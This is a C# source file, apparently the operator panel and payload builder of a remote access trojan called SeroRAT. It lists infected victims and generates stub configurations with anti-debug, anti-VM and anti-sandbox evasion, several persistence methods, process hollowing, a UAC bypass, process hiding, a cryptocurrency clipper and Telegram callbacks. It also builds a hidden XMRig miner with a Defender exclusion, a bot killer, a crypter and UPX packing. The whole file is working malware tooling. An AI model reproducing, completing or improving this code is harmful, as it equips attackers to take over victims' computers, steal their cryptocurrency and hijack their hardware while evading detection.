                || c.Username.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.MachineName.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.CountryDisplay.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.OS.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.ActiveWindow.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.Payload.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.Antivirus.Contains(q, StringComparison.OrdinalIgnoreCase);
            if (!match) return false;
        }

        // 2. Webcam Filter
        if (_webcamFilterOnly && !c.CameraStatus.Equals("Yes", StringComparison.OrdinalIgnoreCase))
            return false;

        // 3. Admin Filter
        if (_adminFilterOnly && !c.IsAdmin)
            return false;

        return true;
    }

    private void CopyRecordHwid_Click(object sender, RoutedEventArgs e)
    {
        var records = GridAllClients.SelectedItems.Cast<ClientRecord>().ToList();
        if (records.Count == 0) return;

        var hwids = string.Join("\n", records.Select(r => r.Hwid));
        Clipboard.SetText(hwids);
        SetStatus(records.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {records.Count} HWIDs");
    }

    // ── Builder ─────────────────────────────────────

    private void BldGenMutex_Click(object sender, RoutedEventArgs e)
    {
        BldMutex.Text = $"Global\\{{{Guid.NewGuid()}}}";
    }

    private void BldPersist_Changed(object sender, RoutedEventArgs e)
    {
        if (BldInstallPanel == null) return;

        bool anyPersist = BldPersistRegistry.IsChecked == true
                       || BldPersistStartup.IsChecked == true
                       || BldPersistTask.IsChecked == true;

        BldInstallPanel.Visibility = anyPersist ? Visibility.Visible : Visibility.Collapsed;

        bool maxPersist = BldAntiKill.IsChecked == true
                       && BldPersistRegistry.IsChecked == true
                       && BldPersistStartup.IsChecked == true
                       && BldPersistTask.IsChecked == true;

        if (TxtMaxPersist != null)
            TxtMaxPersist.Visibility = maxPersist ? Visibility.Visible : Visibility.Collapsed;
    }

    private async void BtnTelegramTest_Click(object sender, RoutedEventArgs e)
    {
        var token   = BldTelegramToken.Text.Trim();
        var chatId1 = BldTelegramChatId1.Text.Trim();
        var chatId2 = BldTelegramChatId2.Text.Trim();

        if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId1))
        {
            TxtTelegramTestResult.Text       = "✗ Fill token + Chat ID 1";
            TxtTelegramTestResult.Foreground = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromRgb(0xEF, 0x44, 0x44));
            return;
        }

        BtnTelegramTest.IsEnabled            = false;
        TxtTelegramTestResult.Text           = "Sending…";
        TxtTelegramTestResult.Foreground     = new System.Windows.Media.SolidColorBrush(
            System.Windows.Media.Color.FromRgb(0x70, 0x90, 0xC0));

        var targets = new List<string> { chatId1 };
        if (!string.IsNullOrEmpty(chatId2)) targets.Add(chatId2);

        string msg = "SeroRAT - test notification\nBot is configured correctly.";
        bool allOk = true;
        string? lastErr = null;

        try
        {
            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(15) };
            foreach (var id in targets)
            {
                var url  = $"https://api.telegram.org/bot{token}/sendMessage" +
                           $"?chat_id={Uri.EscapeDataString(id)}" +
                           $"&text={Uri.EscapeDataString(msg)}";
                var resp = await http.GetAsync(url);
                if (!resp.IsSuccessStatusCode)
                {
                    allOk = false;
                    var respBody = await resp.Content.ReadAsStringAsync();
                    var desc = "";
                    try
                    {
                        var j = System.Text.Json.JsonDocument.Parse(respBody);
                        if (j.RootElement.TryGetProperty("description", out var d))
                            desc = d.GetString() ?? "";
                    }
                    catch { }
                    lastErr = string.IsNullOrEmpty(desc)
                        ? $"HTTP {(int)resp.StatusCode} — chat_id: {id}"
                        : $"{desc} (chat_id: {id})";
                }
            }
        }
        catch (TaskCanceledException)
        {
            allOk   = false;
            lastErr = "Timeout — api.telegram.org unreachable or token invalid";
        }
        catch (System.Net.Http.HttpRequestException ex)
        {
            allOk   = false;
            lastErr = $"Network error: {ex.Message}";
        }
        catch (Exception ex)
        {
            allOk   = false;
            lastErr = $"{ex.GetType().Name}: {ex.Message}";
        }

        BtnTelegramTest.IsEnabled = true;
        if (allOk)
        {
            TxtTelegramTestResult.Text       = "✓ Success";
            TxtTelegramTestResult.Foreground = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromRgb(0x22, 0xC5, 0x5E));
        }
        else
        {
            TxtTelegramTestResult.Text       = $"✗ Error: {lastErr}";
            TxtTelegramTestResult.Foreground = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromRgb(0xEF, 0x44, 0x44));
        }
    }

    private void BldSaveConfig_Click(object sender, RoutedEventArgs e)
    {
        var result = MessageBox.Show(
            "Save builder configuration?",
            "Sero — Confirm",
            MessageBoxButton.YesNo,
            MessageBoxImage.Question);

        if (result == MessageBoxResult.Yes)
        {
            SaveConfig();
            SetStatus("Configuration saved.");
        }
    }

    private void BldCheckAll_Click(object sender, RoutedEventArgs e)
    {
        BldAntiDebug.IsChecked = true;
        BldAntiVM.IsChecked = true;
        BldAntiDetect.IsChecked = true;
        BldAntiSandbox.IsChecked = true;
        BldAntiKill.IsChecked = true;
        BldAntiKill.IsChecked = true;
        BldPersistRegistry.IsChecked = true;
        BldPersistStartup.IsChecked = true;
        BldPersistTask.IsChecked = true;
        BldHollowing.IsChecked = true;
    }

    private void LoadConfig()
    {
        try
        {
            if (!File.Exists(ConfigFilePath)) return;
            var json = File.ReadAllText(ConfigFilePath);
            var cfg = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, string>>(json);
            if (cfg == null) return;

            // Auth key (locked once set)
            if (cfg.TryGetValue("AuthKey", out var key) && !string.IsNullOrEmpty(key))
            { BldAuthKey.Text = key; BldAuthKey.IsReadOnly = true; }

            // Connection (supports multiple hosts)
            if (cfg.TryGetValue("Hosts", out var hostsJson))
            {
                BldHosts.Items.Clear();
                var hosts = Newtonsoft.Json.JsonConvert.DeserializeObject<List<string>>(hostsJson);
                if (hosts != null)
                {
                    foreach (var h in hosts)
                        BldHosts.Items.Add(h);
                }
            }
            else if (cfg.TryGetValue("Host", out var host))
            {
                // Backward compatibility with old single-host config
                BldHosts.Items.Clear();
                BldHosts.Items.Add(host);
            }
            if (cfg.TryGetValue("Port", out var port)) { BldPort.Text = port; TxtPort.Text = port; }
            if (cfg.TryGetValue("UsePastebin", out var pastebin)) BldUsePastebin.IsChecked = pastebin == "1";
            if (cfg.TryGetValue("PastebinUrl", out var pastebinUrl)) BldPastebinUrl.Text = pastebinUrl;

            // Identity
            if (cfg.TryGetValue("ClientIdPrefix", out var cp)) BldClientIdPrefix.Text = cp;

            // Checkboxes
            if (cfg.TryGetValue("AntiDebug", out var v)) BldAntiDebug.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiVM", out v)) BldAntiVM.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiDetect", out v)) BldAntiDetect.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiSandbox", out v)) BldAntiSandbox.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiKill", out v)) BldAntiKill.IsChecked = v == "1";
            if (cfg.TryGetValue("PersistRegistry", out v)) BldPersistRegistry.IsChecked = v == "1";
            if (cfg.TryGetValue("PersistStartup", out v)) BldPersistStartup.IsChecked = v == "1";
            if (cfg.TryGetValue("PersistTask", out v)) BldPersistTask.IsChecked = v == "1";
            if (cfg.TryGetValue("Hollowing", out v)) BldHollowing.IsChecked = v == "1";
            if (cfg.TryGetValue("HollowTarget", out var ht)) BldHollowTarget.Text = ht;
            if (cfg.TryGetValue("Encrypt", out v)) BldEncrypt.IsChecked = v == "1";
            if (cfg.TryGetValue("UacBypass", out v)) BldUacBypass.IsChecked = v == "1";

            // Reconnect
            if (cfg.TryGetValue("ReconnectDelay", out var rd)) BldReconnectDelay.Text = rd;

            // Install folder & file name
            if (cfg.TryGetValue("InstallFolder", out var installFolder)) BldInstallFolder.Text = installFolder;
            if (cfg.TryGetValue("InstallFileName", out var installFileName)) BldInstallFileName.Text = installFileName;

            // Settings tab
            if (cfg.TryGetValue("MaxClients", out var mc) && !string.IsNullOrEmpty(mc)) SettingsMaxClients.Text = mc;
            if (cfg.TryGetValue("DiscordRPC", out v)) SettingsDiscordRPC.IsChecked = v == "1";
            if (cfg.TryGetValue("NotifySound",  out v)) SettingsNotifySound.IsChecked  = v == "1";
            if (cfg.TryGetValue("HideLogo", out v) && v == "1")
            {
                SettingsHideLogo.IsChecked = true;
                BgLogoImage.Visibility = Visibility.Collapsed;
            }
            SettingsShowSeconds.IsChecked = UiPrefs.GetInt("ShowSeconds", 0) == 1;
            if (cfg.TryGetValue("BlockCapture", out v) && v == "1")
            {
                SettingsBlockCapture.IsChecked = true;
                var hwnd = new System.Windows.Interop.WindowInteropHelper(this).Handle;
                if (!SetWindowDisplayAffinity(hwnd, 0x11u))
                    SetWindowDisplayAffinity(hwnd, 0x1u);
            }

            // Telegram notifications
            if (cfg.TryGetValue("TelegramEnabled", out v)) BldTelegramEnabled.IsChecked = v == "1";
            if (cfg.TryGetValue("TelegramToken", out var tt)) BldTelegramToken.Text = tt;
            if (cfg.TryGetValue("TelegramChatId1", out var tc1)) BldTelegramChatId1.Text = tc1;
            if (cfg.TryGetValue("TelegramChatId2", out var tc2)) BldTelegramChatId2.Text = tc2;
            if (cfg.TryGetValue("MnrStatsToken", out var mst) && !string.IsNullOrEmpty(mst)) BldMnrStatsToken.Text = mst;

            // Crypto Clipper
            if (cfg.TryGetValue("ClipperBTC",  out var cBtc))  ClipperBTC.Text  = cBtc;
            if (cfg.TryGetValue("ClipperETH",  out var cEth))  ClipperETH.Text  = cEth;
            if (cfg.TryGetValue("ClipperLTC",  out var cLtc))  ClipperLTC.Text  = cLtc;
            if (cfg.TryGetValue("ClipperTRX",  out var cTrx))  ClipperTRX.Text  = cTrx;
            if (cfg.TryGetValue("ClipperSOL",  out var cSol))  ClipperSOL.Text  = cSol;
            if (cfg.TryGetValue("ClipperXMR",  out var cXmr))  ClipperXMR.Text  = cXmr;
            if (cfg.TryGetValue("ClipperXRP",  out var cXrp))  ClipperXRP.Text  = cXrp;
            if (cfg.TryGetValue("ClipperDASH", out var cDash)) ClipperDASH.Text = cDash;
            if (cfg.TryGetValue("ClipperBCH",  out var cBch))  ClipperBCH.Text  = cBch;

            Log("[+] Builder config loaded.");
        }
        catch { }
    }

    private void SaveConfig()
    {
        try
        {
            var path = ConfigFilePath;
            var cfg = new Dictionary<string, string>
            {
                ["AuthKey"] = BldAuthKey.Text.Trim(),
                ["Hosts"] = Newtonsoft.Json.JsonConvert.SerializeObject(BldHosts.Items.Cast<string>().ToList()),
                ["Host"] = GetPrimaryHost(), // backward compatibility
                ["Port"] = TxtPort.Text.Trim(),
                ["ClientIdPrefix"] = BldClientIdPrefix.Text.Trim(),
                ["UsePastebin"] = BldUsePastebin.IsChecked == true ? "1" : "0",
                ["PastebinUrl"] = BldPastebinUrl.Text.Trim(),
                ["AntiDebug"] = BldAntiDebug.IsChecked == true ? "1" : "0",
                ["AntiVM"] = BldAntiVM.IsChecked == true ? "1" : "0",
                ["AntiDetect"] = BldAntiDetect.IsChecked == true ? "1" : "0",
                ["AntiSandbox"] = BldAntiSandbox.IsChecked == true ? "1" : "0",
                ["AntiKill"] = BldAntiKill.IsChecked == true ? "1" : "0",
                ["PersistRegistry"] = BldPersistRegistry.IsChecked == true ? "1" : "0",
                ["PersistStartup"] = BldPersistStartup.IsChecked == true ? "1" : "0",
                ["PersistTask"] = BldPersistTask.IsChecked == true ? "1" : "0",
                ["Hollowing"] = BldHollowing.IsChecked == true ? "1" : "0",
                ["HollowTarget"] = GetHollowTarget(),
                ["Encrypt"] = BldEncrypt.IsChecked == true ? "1" : "0",
                ["UacBypass"] = BldUacBypass.IsChecked == true ? "1" : "0",
                ["ReconnectDelay"] = BldReconnectDelay.Text.Trim(),
                ["InstallFolder"] = BldInstallFolder.Text.Trim(),
                ["InstallFileName"] = BldInstallFileName.Text.Trim(),
                ["MaxClients"] = SettingsMaxClients.Text.Trim(),
                ["DiscordRPC"] = SettingsDiscordRPC.IsChecked == true ? "1" : "0",
                ["NotifySound"] = SettingsNotifySound.IsChecked == true ? "1" : "0",
                ["HideLogo"] = SettingsHideLogo.IsChecked == true ? "1" : "0",
                ["BlockCapture"] = SettingsBlockCapture.IsChecked == true ? "1" : "0",
                ["TelegramEnabled"] = BldTelegramEnabled.IsChecked == true ? "1" : "0",
                ["TelegramToken"] = BldTelegramToken.Text.Trim(),
                ["TelegramChatId1"] = BldTelegramChatId1.Text.Trim(),
                ["TelegramChatId2"] = BldTelegramChatId2.Text.Trim(),
                ["MnrStatsToken"] = BldMnrStatsToken.Text.Trim(),
                ["ClipperBTC"]  = ClipperBTC.Text.Trim(),
                ["ClipperETH"]  = ClipperETH.Text.Trim(),
                ["ClipperLTC"]  = ClipperLTC.Text.Trim(),
                ["ClipperTRX"]  = ClipperTRX.Text.Trim(),
                ["ClipperSOL"]  = ClipperSOL.Text.Trim(),
                ["ClipperXMR"]  = ClipperXMR.Text.Trim(),
                ["ClipperXRP"]  = ClipperXRP.Text.Trim(),
                ["ClipperDASH"] = ClipperDASH.Text.Trim(),
                ["ClipperBCH"]  = ClipperBCH.Text.Trim(),
            };
            File.WriteAllText(path, Newtonsoft.Json.JsonConvert.SerializeObject(cfg, Newtonsoft.Json.Formatting.Indented));
            Log($"[+] Config saved to {path}");

        }
        catch (Exception ex) { Log($"[!] Failed to save config: {ex.Message}"); }
    }

    private string GetStubProjectDir()
    {
        // Strategy 1: relative to BaseDirectory (bin/Debug/net10.0-windows -> sero/)
        var serverDir = AppDomain.CurrentDomain.BaseDirectory;
        var seroRoot = Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", ".."));
        var stubDir = Path.Combine(seroRoot, "stub");
        if (Directory.Exists(stubDir) && File.Exists(Path.Combine(stubDir, "SeroStub.csproj")))
            return stubDir;

        // Strategy 2: walk up from BaseDirectory looking for stub/SeroStub.csproj
        var dir = new DirectoryInfo(serverDir);
        while (dir != null)
        {
            var candidate = Path.Combine(dir.FullName, "stub");
            if (File.Exists(Path.Combine(candidate, "SeroStub.csproj")))
                return candidate;
            dir = dir.Parent;
        }

        // Fallback
        return stubDir;
    }

    /// <summary>
    /// Finds the pre-compiled hook DLL (x64 Release) relative to the server binary.
    /// Returns null if not found.
    /// </summary>
    private string? FindHookDll()
    {
        var serverDir = AppDomain.CurrentDomain.BaseDirectory;
        // Repo layout varies: server/bin/Debug/net10.0-windows/ (4 up) or server/bin/x64/Release/net10.0-windows/ (5 up)
        var candidates = new[]
        {
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "..", "hook", "hook", "x64", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "hook", "hook", "x64", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "..", "hook", "x64", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "hook", "x64", "Release", "hook.dll")),
            Path.Combine(serverDir, "hook.dll"),
            Path.GetFullPath(Path.Combine(serverDir, "..", "hook.dll")),
        };
        foreach (var c in candidates)
            if (File.Exists(c)) return c;
        return null;
    }

    private string? FindHookDll32()
    {
        var serverDir = AppDomain.CurrentDomain.BaseDirectory;
        var c32 = new[]
        {
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "..", "hook", "hook", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "hook", "hook", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "..", "hook", "hook", "Win32", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "hook", "hook", "Win32", "Release", "hook.dll")),
            Path.Combine(serverDir, "hook32.dll"),
        };
        foreach (var c in c32) if (File.Exists(c)) return c;
        return null;
    }

    private string GenerateConfigCs()
    {
        int.TryParse(BldPort.Text, out int port);
        int.TryParse(BldReconnectDelay.Text, out int reconnect);
        if (port < 1 || port > 65535) port = 7777;
        if (reconnect < 1000) reconnect = 5000;

        var installFolder = BldInstallFolder.Text.Trim();
        if (string.IsNullOrEmpty(installFolder)) installFolder = "Windows";
        var installFileName = BldInstallFileName.Text.Trim();
        if (string.IsNullOrEmpty(installFileName)) installFileName = "windows.exe";
        // Ensure .exe extension
        if (!installFileName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            installFileName += ".exe";
        var fileNameNoExt = Path.GetFileNameWithoutExtension(installFileName);

        var useMutex = BldUseMutex.IsChecked == true ? "true" : "false";
        // Generate a unique mutex name per build so old test instances never block new builds
        var mutexName = BldUseMutex.IsChecked == true ? $"Global\\\\{Guid.NewGuid():N}" : "";

        // Escape for C# string literal — prevents quote injection in generated Config.cs
        static string Esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");

        const string hookDllLine   = "    public static readonly byte[] HookDllBytes   = Array.Empty<byte>();";
        const string hookDll32Line = "    public static readonly byte[] HookDllBytes32 = Array.Empty<byte>();";

        // Per-build random SFC64 seed for Telegram credentials
        var telegramSfcSeedBytes = System.Security.Cryptography.RandomNumberGenerator.GetBytes(32);
        static string ByteArrayLiteral(byte[] b) =>
            "new byte[] { " + string.Join(", ", b.Select(x => x.ToString())) + " }";
        string telegramSfcSeedLiteral = ByteArrayLiteral(telegramSfcSeedBytes);

        return $@"namespace SeroStub;

internal static class Config
{{
    public static readonly string[] Hosts = new[] {{ {string.Join(", ", BldHosts.Items.Cast<string>().Select(h => $"\"{Esc(h)}\""))} }};
    public const int Port = {port};
    public const bool UseMutex = {useMutex};
    public const string MutexName = ""{mutexName}"";

    public const bool AntiDebug = {(BldAntiDebug.IsChecked == true ? "true" : "false")};
    public const bool AntiVM = {(BldAntiVM.IsChecked == true ? "true" : "false")};
    public const bool AntiDetect = {(BldAntiDetect.IsChecked == true ? "true" : "false")};
    public const bool AntiSandbox = {(BldAntiSandbox.IsChecked == true ? "true" : "false")};

    public const bool PersistRegistry = {(BldPersistRegistry.IsChecked == true ? "true" : "false")};
    public const bool PersistStartup = {(BldPersistStartup.IsChecked == true ? "true" : "false")};
    public const bool PersistTask = {(BldPersistTask.IsChecked == true ? "true" : "false")};
    public const string PersistName = ""{Esc(fileNameNoExt.ToLowerInvariant())}"";

    public const bool AntiKill = {(BldAntiKill.IsChecked == true ? "true" : "false")};
    public const bool EnableWatchdog = {(BldAntiKill.IsChecked == true ? "true" : "false")};
    public const bool EnableHollowing = {(BldHollowing.IsChecked == true ? "true" : "false")};
    public const string HollowTarget = ""{Esc(GetHollowTarget())}"";

    public const string AuthKey = ""{Esc(BldAuthKey.Text.Trim())}"";
    public const string CertHash = ""{Esc(BldCertHash.Text.Trim())}"";

    // Unique per build — changes the compiled binary hash even with identical settings
    public const string BuildId = ""{Guid.NewGuid():N}"";

    public const int ReconnectDelayMs = {reconnect};
    public const int HeartbeatIntervalMs = 3000;

    public const string ClientIdPrefix = ""{Esc(BldClientIdPrefix.Text.Trim())}"";

    // HiddenProcessName = install filename without extension = DLL prefix
    // The hook DLL reads its own filename as the prefix and hides everything starting with it.
    public const string HiddenProcessName = ""{Esc(fileNameNoExt.ToLowerInvariant())}"";
    public const string HiddenFileName = ""{Esc(installFileName.ToLowerInvariant())}"";

    public const bool EnableRootkit = false;
{hookDllLine}
{hookDll32Line}

    // Telegram notification (SFC64-encoded — never stored as plaintext in binary)
    public const bool TelegramEnabled = {(BldTelegramEnabled.IsChecked == true ? "true" : "false")};
    public static readonly byte[] TelegramTokenSfc   = {ByteArrayLiteral(SfcEncode(System.Text.Encoding.UTF8.GetBytes(BldTelegramToken.Text.Trim()),   telegramSfcSeedBytes))};
    public static readonly byte[] TelegramChatId1Sfc = {ByteArrayLiteral(SfcEncode(System.Text.Encoding.UTF8.GetBytes(BldTelegramChatId1.Text.Trim()), telegramSfcSeedBytes))};
    public static readonly byte[] TelegramChatId2Sfc = {ByteArrayLiteral(SfcEncode(System.Text.Encoding.UTF8.GetBytes(BldTelegramChatId2.Text.Trim()), telegramSfcSeedBytes))};
    public static readonly byte[] TelegramSfcSeed    = {telegramSfcSeedLiteral};
}}
";
    }

    // ── XMR Miner builder ────────────────────────────────────────────────────

    private string GetMinerStubProjectDir()
    {
        var serverExeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";

        // Walk up to 6 parent levels and scan each level's subdirectories for MinerStub.csproj.
        // This way the folder can be named anything — folder name is irrelevant.
        var dir = serverExeDir;
        for (int i = 0; i <= 6; i++)
        {
            if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir)) break;
            try
            {
                foreach (var sub in Directory.GetDirectories(dir))
                {
                    if (File.Exists(Path.Combine(sub, "MinerStub.csproj")))
                        return sub;
                }
            }
            catch { }
            dir = Path.GetDirectoryName(dir);
        }

        return ""; // not found
    }

    private void AutoDetectXmrig()
    {
        var serverExeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
        var stubDir = GetStubProjectDir();
        var candidates = new[]
        {
            // SCM custom xmrig — supports --cinit-kill-targets (BotKiller)
            Path.Combine(serverExeDir, "..", "..", "..", "..", "..", "SilentCryptoMiner-main", "SilentCryptoMiner-main", "Resources", "Miners", "xmrig.exe"),
            Path.Combine(serverExeDir, "..", "..", "..", "..", "SilentCryptoMiner-main", "SilentCryptoMiner-main", "Resources", "Miners", "xmrig.exe"),
            Path.Combine(stubDir, "..", "SilentCryptoMiner-main", "SilentCryptoMiner-main", "Resources", "Miners", "xmrig.exe"),
            // Standard xmrig fallback
            Path.Combine(serverExeDir, "..", "..", "..", "..", "..", "xmrig-release", "xmrig.exe"),
            Path.Combine(serverExeDir, "..", "..", "..", "..", "xmrig-release", "xmrig.exe"),
            Path.Combine(stubDir, "..", "xmrig-release", "xmrig.exe"),
        };
        foreach (var raw in candidates)
        {
            var path = Path.GetFullPath(raw);
            if (!File.Exists(path)) continue;
            try
            {
                _bldXmrigBytes = File.ReadAllBytes(path);
                _bldXmrigPath  = path;
                BldMnrXmrigPath.Text       = $"xmrig.exe  ({_bldXmrigBytes.Length / 1024} KB)  — auto-detected";
                BldMnrXmrigPath.Foreground = new SolidColorBrush(Color.FromRgb(0x22, 0xC5, 0x5E));
                return;
            }
            catch { }
        }
        _bldXmrigBytes = null;
        _bldXmrigPath  = null;
        BldMnrXmrigPath.Text       = "xmrig.exe not found — place in xmrig-release/xmrig.exe";
        BldMnrXmrigPath.Foreground = new SolidColorBrush(Color.FromRgb(0xEF, 0x44, 0x44));
    }

    private string GenerateMinerConfigCs()
    {
        static string Esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        int.TryParse(BldMnrCpuIdle.Text,       out int cpuIdle);   if (cpuIdle   < 0 || cpuIdle   > 100) cpuIdle   = 75;
        int.TryParse(BldMnrCpuActive.Text,     out int cpuActive); if (cpuActive < 0 || cpuActive > 100) cpuActive = 50;
        int.TryParse(BldMnrIdleSec.Text,       out int idleSec);   if (idleSec  < 5)                    idleSec   = 30;
        if (_bldSfcSeed == null)
        {
            Log("[!] Miner: SFC seed not initialized — run 'Load xmrig' first.");
            return "";
        }
        string sfcSeedB64 = Convert.ToBase64String(_bldSfcSeed);

        return $@"namespace MinerStub;

internal static class MinerConfig
{{
    public const string PoolUrl          = ""{Esc(BldMnrPool.Text.Trim())}"";
    public const bool   PoolTls          = {(BldMnrTls.IsChecked == true ? "true" : "false")};
    public const string Wallet           = ""{Esc(BldMnrWallet.Text.Trim())}"";
    public const string Password         = ""{Esc(BldMnrPass.Text.Trim())}"";
    public const string WorkerName       = ""{Esc(BldMnrWorkerName.Text.Trim())}"";
    public const string Algo             = ""{Esc(BldMnrAlgo.Text.Trim())}"";
    public const int    MaxCpuIdle       = {cpuIdle};
    public const int    MaxCpuActive     = {cpuActive};
    public const int    IdleThresholdSec = {idleSec};
    public const string InstallName      = ""{Esc(BldMnrInstallName.Text.Trim())}"";
    public const string StealthProcs     = ""{(BldMnrStealth.IsChecked == true ? "taskmgr.exe,procexp.exe,procexp64.exe,systeminformer.exe,processhacker.exe" : "")}"";
    public const bool   EnableStartup    = {(BldMnrStartup.IsChecked    == true ? "true" : "false")};
    public const bool   EnableSafeBoot   = {(BldMnrSafeBoot.IsChecked   == true ? "true" : "false")};
    public const bool   EnableWatchdog   = {(BldMnrWatchdog.IsChecked   == true ? "true" : "false")};
    public const bool   DisableSleep     = {(BldMnrDisableSleep.IsChecked == true ? "true" : "false")};
    public const bool   EnableHollowing  = {(BldMnrHollow.IsChecked      == true ? "true" : "false")};
    public const string HollowTarget     = ""{Esc(BldMnrHollowTarget.Text.Trim())}"";
    public const bool   EnableBotKiller          = {(BldMnrBotKiller.IsChecked == true ? "true" : "false")};
    public const bool   EnableDefenderExclusion  = true;
    public const string StatsUrl         = ""{Esc(BldMnrStatsUrl.Text.Trim())}"";
    public const string StatsToken       = ""{Esc(BldMnrStatsToken.Text.Trim())}"";
    public const string SfcSeed          = ""{sfcSeedB64}"";
}}
";
    }

    private async void BldMnrBuild_Click(object sender, RoutedEventArgs e)
    {
        var minerDir = GetMinerStubProjectDir();
        if (string.IsNullOrEmpty(minerDir) || !Directory.Exists(minerDir))
        {
            TxtMnrBuildStatus.Text = "Error: MinerStub project not found. Place the miner-stub folder (containing MinerStub.csproj) next to the server exe or in the SeroC2 root directory.";
            return;
        }
        if (_bldXmrigBytes == null || _bldXmrigBytes.Length == 0)
        {
            TxtMnrBuildStatus.Text = "Error: xmrig.exe not found. Place xmrig.exe in xmrig-release/.";
            return;
        }

        var dlg = new Microsoft.Win32.SaveFileDialog
        {
            Filter   = "Executable (*.exe)|*.exe",
            FileName = "miner.exe",
            Title    = "Save miner executable"
        };
        if (dlg.ShowDialog() != true) return;
        var outputExe = dlg.FileName;

        BtnMnrBuild.IsEnabled  = false;
        TxtMnrBuildStatus.Text = "Generating MinerConfig.cs…";

        try
        {
            // Generate random SFC64 seed for this build, then write encrypted MinerConfig + xmrig.bin
            _bldSfcSeed = new byte[32];
            System.Security.Cryptography.RandomNumberGenerator.Fill(_bldSfcSeed);

            var cfgPath = Path.Combine(minerDir, "MinerConfig.cs");
            var minerCfg = GenerateMinerConfigCs();
            if (string.IsNullOrEmpty(minerCfg)) return; // XOR key not ready (logged in GenerateMinerConfigCs)
            await File.WriteAllTextAsync(cfgPath, minerCfg);

            // Deflate-compress then XOR-encrypt xmrig before embedding
            var xmrigBinDst = Path.Combine(minerDir, "xmrig.bin");
            if (_bldXmrigBytes != null && _bldXmrigBytes.Length > 0)
            {
                using var compMs = new System.IO.MemoryStream();
                using (var deflate = new System.IO.Compression.DeflateStream(compMs, System.IO.Compression.CompressionLevel.Optimal, leaveOpen: true))
                    deflate.Write(_bldXmrigBytes, 0, _bldXmrigBytes.Length);
                var compressed = compMs.ToArray();
                await File.WriteAllBytesAsync(xmrigBinDst, SfcEncode(compressed, _bldSfcSeed!));
            }

            TxtMnrBuildStatus.Text = "Compiling (NativeAOT)…";
            Log("[*] MinerBuilder: dotnet publish…");

            var tempOut    = Path.Combine(Path.GetTempPath(), "sero_miner_" + Guid.NewGuid().ToString("N")[..8]);
            var csprojPath = Path.Combine(minerDir, "MinerStub.csproj");
            var ilcThreads = Math.Min(Environment.ProcessorCount, 8);
            var publishArgs = $"publish \"{csprojPath}\" -c Release -r win-x64 -p:PublishAot=true -p:InvariantGlobalization=true -p:IlcOptimizationPreference=Size -p:IlcGenerateStackTraceData=false -p:IlcFoldIdenticalMethodBodies=true -p:IlcMaxParallelism={ilcThreads} -o \"{tempOut}\"";

            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName               = "dotnet",
                Arguments              = publishArgs,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
                WorkingDirectory       = minerDir,
            };
            var vsInstaller = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Microsoft Visual Studio", "Installer");
            if (Directory.Exists(vsInstaller))
                psi.Environment["PATH"] = vsInstaller + ";" + Environment.GetEnvironmentVariable("PATH");

            using var proc       = System.Diagnostics.Process.Start(psi)!;
            var stdoutTask       = proc.StandardOutput.ReadToEndAsync();
            var stderrTask       = proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();
            var stdout = await stdoutTask;
            var stderr = await stderrTask;

            if (proc.ExitCode != 0)
            {
                Log($"[!] MinerBuilder: Build failed (exit {proc.ExitCode})");
                if (!string.IsNullOrWhiteSpace(stderr)) Log(stderr);
                TxtMnrBuildStatus.Text = "Build FAILED. Check logs.";
                return;
            }

            var builtExe = Directory.GetFiles(tempOut, "*.exe").FirstOrDefault();
            if (builtExe == null) { TxtMnrBuildStatus.Text = "Build output not found."; return; }

            File.Copy(builtExe, outputExe, true);
            try { Directory.Delete(tempOut, true); } catch { }
            // Clean up the temporary xmrig.bin resource file from the project dir
            try { File.Delete(xmrigBinDst); } catch { }

            if (BldMnrEncrypt.IsChecked == true)
            {
                TxtMnrBuildStatus.Text = "Applying crypter…";
                Log("[*] MinerBuilder: applying C++ crypter…");
                try { await SeroServer.Builder.CrypterBuilder.ApplyAsync(outputExe, Log, iconPath: null, metadata: null, uacBypass: false); Log("[+] MinerBuilder: crypter applied."); }
                catch (Exception cex) { Log($"[!] MinerBuilder: crypter skipped — {cex.Message}"); }
            }

            if (BldMnrUpx.IsChecked == true)
            {
                TxtMnrBuildStatus.Text = "Compressing (UPX)…";
                Log("[*] MinerBuilder: Running UPX…");
                string upxExe = "upx";
